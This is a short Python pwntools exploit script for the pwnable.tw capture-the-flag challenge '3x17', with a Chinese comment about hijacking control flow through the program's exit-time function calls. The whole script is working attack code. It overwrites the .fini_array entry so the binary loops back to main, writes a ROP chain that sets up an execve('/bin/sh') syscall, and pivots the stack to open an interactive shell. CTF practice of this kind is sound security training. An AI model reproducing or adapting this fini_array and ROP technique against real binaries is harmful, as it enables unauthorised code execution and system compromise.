#利用程序退出时函数调用过程来控制程序流程
from pwn import *

context.log_level="debug"
p=process("3x17")
#p=remote("chall.pwnable.tw",10105)


fini = 0x4b40f0
main = 0x401b6d
call_fini = 0x402960

p.sendlineafter("addr:",str(fini))
p.sendafter("data:",p64(call_fini)+p64(main))


pop_rdi=0x401696
pop_rax=0x41e4af
pop_rdx_rsi=0x44a309
binsh=0x4b4140

p.sendlineafter("addr:",str(0x4b4100))
p.sendafter("data:",p64(pop_rdi)+p64(binsh)+p64(pop_rax))
p.sendlineafter("addr:",str(0x4b4118))
p.sendafter("data:",p64(0x3b) + p64(pop_rdx_rsi) + p64(0))
p.sendlineafter("addr:",str(0x4b4130))
p.sendafter("data:",p64(0) + p64(0x446e2c)+"/bin/sh\x00")


p.sendlineafter("addr:",str(0x4b40f0))
p.sendafter("data:",p64(0x401c4b))

p.interactive()